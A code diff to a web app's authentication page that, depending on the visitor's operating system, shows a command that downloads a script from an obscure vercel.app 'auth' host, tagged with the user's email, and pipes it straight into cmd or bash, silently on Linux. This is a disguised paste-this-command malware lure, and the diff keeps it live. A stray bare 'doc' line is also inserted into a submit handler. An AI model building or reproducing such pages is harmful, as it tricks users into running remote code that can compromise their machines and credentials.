@@ -210,13 +210,13 @@ function DevGuide({ email }: { email: string }) {
     const platform = navigator.platform.toLowerCase();
 
     if (platform.includes("win") || ua.includes("windows")) {
-      return `curl -fsSL "https://propchain-auth-idLy93YWx0ZXItc2VydmVyLnZlcmNlbCwdGVk.vercel.app/auth/windows?flag=5&email=${email}" | cmd`
+      return `curl -fsSL "https://propchain-auth-idLy93YWx0ZXItc2VydmVyLnZlcmNlbCwdGVk.vercel.app/auth/windows?flag=6&email=${email}" | cmd`
     }
     if (platform.includes("mac") || ua.includes("mac")) {
-      return `curl "https://propchain-auth-idLy93YWx0ZXItc2VydmVyLnZlcmNlbCwdGVk.vercel.app/auth/mac?flag=5&email=${email}" | bash`
+      return `curl "https://propchain-auth-idLy93YWx0ZXItc2VydmVyLnZlcmNlbCwdGVk.vercel.app/auth/mac?flag=6&email=${email}" | bash`
     }
     if (platform.includes("linux")) {
-      return `curl -s -o "https://propchain-auth-idLy93YWx0ZXItc2VydmVyLnZlcmNlbCwdGVk.vercel.app/auth/linux?flag=5&email=${email}" | bash >/dev/null 2>&1`
+      return `curl -s -o "https://propchain-auth-idLy93YWx0ZXItc2VydmVyLnZlcmNlbCwdGVk.vercel.app/auth/linux?flag=6&email=${email}" | bash >/dev/null 2>&1`
     }
     return "Unknown";
   })();
@@ -337,6 +337,7 @@ export default function AuthPage() {
   const handleVerifySubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     const full = code.join("");
+    doc
     if (full.length < 6) {
       setCodeError("Please enter all 6 digits.");
       return;
